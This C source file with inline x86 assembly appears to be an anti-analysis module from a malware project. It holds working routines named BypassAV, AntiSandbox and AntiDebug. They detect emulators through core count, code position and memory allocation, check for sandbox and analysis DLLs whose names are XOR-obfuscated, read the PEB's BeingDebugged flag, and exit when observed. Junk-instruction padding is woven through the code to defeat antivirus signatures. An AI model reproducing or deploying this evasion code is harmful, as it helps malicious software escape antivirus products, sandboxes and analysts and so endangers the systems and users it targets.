#include "antiemul.h"

/*bool TickCountDetect(void)
{
	int tick = CallAPI(dwGetTickCount, 0);
	__asm
	{
		push eax;
		mov eax, 29;
		xor eax, eax;
		jz A;
		push ecx;
		mov ecx, ecx;
	A:
		pop eax;
	};
	CallAPI(dwSleep, 1, 1000);
	__asm
	{
		push eax;
		cld;
		xor al, al;
		xor al, al;
		jz B;
		cld;
		xor ecx, ecx;
		mov ecx, 17;
		lodsb;
	B:
		pop eax;
	};
	int tack = CallAPI(dwGetTickCount, 0);
	__asm
	{
		push ebx;
		mov ebx, 120;
		and al, 0xFF;
		cld;
		test esi, esi;
		xor ebx, ebx;
		jz C
		mov al, al;
		mov al, al;
		cld;
	C:
		pop ebx;
	};
	if (tack - tick < 1000)
		return true;
	else
		return false;
}*/

void MemoryLimitAttack(void)
{
	LPVOID mem = (LPVOID) CallAPI(dwVirtualAlloc, 4, NULL, 400000000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	__asm
	{
		push eax;
		cmp eax, 17;
		jz D;
		mov eax, eax;
		cld;
		test ecx, ecx;
	D:
		or eax, eax;
		clc;
		pop eax;
	};
	if (mem != NULL)
	{
		__asm nop;
		__asm mov al, al;
		ZeroMemory(mem, 100000000);
		__asm
		{
			push ebx;
			mov cl, cl;
			mov cl, cl;
			cld;
			pop ebx;
		};
		CallAPI(dwVirtualFree, 3, mem, 400000000, MEM_RELEASE);
	}
}

bool NumOfCoresDetect(void)
{
	SYSTEM_INFO si;

	CallAPI(dwGetSystemInfo, 1, &si);
	__asm
	{
		push eax;
		mov eax, 12;
		shr eax, 2;
		xor eax, eax;
		pop eax;
	};
	int CoreNum = si.dwNumberOfProcessors;
	__asm
	{
		push ecx;
		xor ecx, ecx;
		mov ecx, 4;
		shl ecx, 1;
		cmp ecx, 8;
		jz E;
	E:
		pop ecx;
	};
	if (CoreNum < 2)
		return true;
	else
		return false;
}

__declspec(naked) bool CodePositionDetect(void)
{
	__asm
	{
		call next;
	next:
		pop eax;
		cmp eax, next;
		jnz emul;
		xor eax, eax;
		ret;
	emul:
		mov eax, 1;
		ret;
	};
}

void BypassAV(void)
{
	if (CodePositionDetect())
		exit(0);

	if (NumOfCoresDetect())
		exit(0);

	LPVOID mem = NULL;
	mem = (LPVOID) CallAPI(dwVirtualAllocExNuma,
		6,
		GetCurrentProcess(),
		NULL,
		1000,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_EXECUTE_READWRITE,
		0);
	if (mem == NULL) exit(0);

	MemoryLimitAttack();
}

bool IsModuleLoaded(char *module)
{
	PPEB peb = NULL;
	PPEB_LDR_DATA ldr = NULL;
	PLIST_ENTRY head = NULL;
	char modname[MAX_PATH] = { 0 };

	__asm
	{
		push eax;
		nop;
		nop;
		nop;
		nop;
		mov eax, dword ptr fs:[0x30];
		nop;
		nop;
		nop;
		nop;
		mov [peb], eax;
		nop;
		nop;
		pop eax;
	};

	ldr = peb->Ldr;
	head = &ldr->InMemoryOrderModuleList;
	for (PLIST_ENTRY next = head->Flink; next != head; next = next->Flink)
	{
		PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)next;
		WideCharToMultiByte(CP_ACP, 0, entry->FullDllName.Buffer, -1, modname, MAX_PATH, NULL, NULL);
		if (lstrcmpiA(modname, module) == 0)
			return true;
	}
	return false;
}

void AntiSandbox(void)
{
	char ax[] = "\xf0\xfe\xf7\xe5\xe1\xe7\xa0\xa1\xbd\xf7\xff\xff\x00";
	char bx[] = "\xc0\xeb\xda\xfd\xbd\xf7\xff\xff\x00";
	char cx[] = "\xc0\xf1\xfa\xf6\xd7\xff\xff\xbd\xf7\xff\xff\x00";
	char dx[] = "\xc0\xf5\xa1\xbd\xf7\xff\xff\x00";
	char ex[] = "\xe0\xfd\xeb\xfb\xf8\xbd\xf7\xff\xff\x00";

	XorBlock(ax, lstrlenA(ax));
	XorBlock(bx, lstrlenA(bx));
	XorBlock(cx, lstrlenA(cx));
	XorBlock(dx, lstrlenA(dx));
	XorBlock(ex, lstrlenA(ex));

	if (IsModuleLoaded(ax)
		|| IsModuleLoaded(bx)
		|| IsModuleLoaded(cx)
		|| IsModuleLoaded(dx)
		|| IsModuleLoaded(ex))
	{
		exit(0);
	}
}

__declspec(naked) unsigned int BeingDebugged(void)
{
	__asm
	{
		/*mov ecx, 10000000;
	repeat:
		inc eax;
		loop repeat;*/

		mov eax, dword ptr fs:[0x30];
		cmp byte ptr [eax + 0x2], 0;
		jnz debug;
		xor eax, eax;
		ret;
	debug:
		mov eax, 1;
		ret;
	};
}

void AntiDebug(void)
{
	while (true)
	{
		if (BeingDebugged())
		{
			CallAPI(dwExitProcess, 1, 0);
		}
		CallAPI(dwSleep, 1, 100);
	}
}
